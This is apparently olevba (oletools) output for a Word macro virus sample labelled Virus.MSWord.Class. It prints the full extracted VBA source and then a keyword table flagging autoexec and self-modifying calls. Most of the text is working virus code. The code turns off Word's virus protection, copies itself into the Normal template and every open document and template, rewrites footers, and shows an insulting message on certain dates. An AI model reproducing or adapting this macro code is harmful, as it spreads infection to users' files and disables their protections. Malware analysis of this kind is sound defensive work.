olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-b64c9bed5b312f48e55786df3275f80297d0d953
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-b64c9bed5b312f48e55786df3275f80297d0d953 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Alberto Manzi Jr.07/08/2000 18:11:55EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
Sub AutoOpen()
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
On Error GoTo out
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
Options.VirusProtection = False
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
Options.SaveNormalPrompt = False
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
Options.ConfirmConversions = False
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If nt > 70 And ad > 0 Then GoTo out
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If nt < 70 Then
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
End If
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
host.CodeModule.AddFromFile ("c:\class.sys")
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
With host.CodeModule
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    For x = 1 To 4
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    .DeleteLines 1
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    Next x
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
End With
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If nt < 70 Then
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    With host.CodeModule
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    .replaceline 1, "Sub AutoClose()"
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    .replaceline 71, "Sub ToolsMacro()"
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    End With
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
End If
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
With host.CodeModule
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    For x = 2 To 72 Step 2
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
    Next x
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
End With
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
out:
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

Sub ToolsMacro()
'Alberto Manzi Jr.07/08/2000 18:11:56EPSON Stylus COLOR 640 on LPT1:DUPLICATClip
Sub viewvbcode()
'Alberto Bitchatcho02/08/00 17:30:07EPSON Stylus COLOR 640 on \\MANZI\EPSONDUPLICATGênio
End Sub


Private Sub Document_Close()
On Error Resume Next
Kill "c:\footprint.$$?"
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    If Not adoc.CustomDocumentProperties("FootPrint1") Then
        adoc.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint1") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

